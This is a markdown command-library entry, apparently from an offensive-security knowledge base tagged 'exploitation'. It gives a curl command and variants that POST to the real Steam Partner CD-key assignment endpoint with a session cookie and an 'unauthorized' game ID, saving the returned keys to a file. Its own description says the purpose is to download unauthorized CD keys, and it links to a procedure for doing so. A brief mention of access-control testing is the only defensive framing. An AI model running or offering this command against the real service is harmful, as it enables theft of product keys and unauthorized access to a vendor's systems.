---
data: >-
  curl -X POST 'https://partner.steamgames.com/partnercdkeys/assignkeys/'
  --cookie 'session_cookie=your_auth_cookie' --data
  'game_id=unauthorized_game_id&key_type=download_existing' -o cd_keys.txt
tags:
  - http
  - api
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 61d534d4-7710-496f-b6de-2c4e5209ffeb
created_at: '2025-12-11T06:10:28.595Z'
updated_at: '2025-12-11T06:10:28.595Z'
verified: false
validated: true
submitted: true
---
# curl-steam-endpoint-access

## Command

```bash
curl -X POST 'https://partner.steamgames.com/partnercdkeys/assignkeys/' \
  --cookie 'session_cookie=your_auth_cookie' \
  --data 'game_id=unauthorized_game_id&key_type=download_existing' \
  -o cd_keys.txt
```

## Description

This command uses curl to send a POST request to the Steam Partner API endpoint, manipulating parameters to download unauthorized CD keys. Use it in scenarios involving API access control testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `--cookie` | Authentication cookie | Yes |
| `--data` | Request parameters (game_id and key_type) | Yes |
| `-o` | Output file for response | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://partner.steamgames.com/partnercdkeys/assignkeys/' --cookie 'session_cookie=your_auth_cookie' --data 'game_id=12345&key_type=download_existing' -o keys.txt
```

### Advanced Usage

```bash
curl -X POST 'https://partner.steamgames.com/partnercdkeys/assignkeys/' --cookie 'session_cookie=your_auth_cookie' --data 'game_id=12345&key_type=download_existing&format=json' -o keys.json
```

## Expected Output

Successful execution saves CD keys to the output file (e.g., cd_keys.txt) with no console errors; file contains key lists if access is granted.

## Related

- [[curl]]
- [[procedures/Access-Unauthorized-CD-Keys-via-Steam-Partner-Endpoint-Manipulation]]
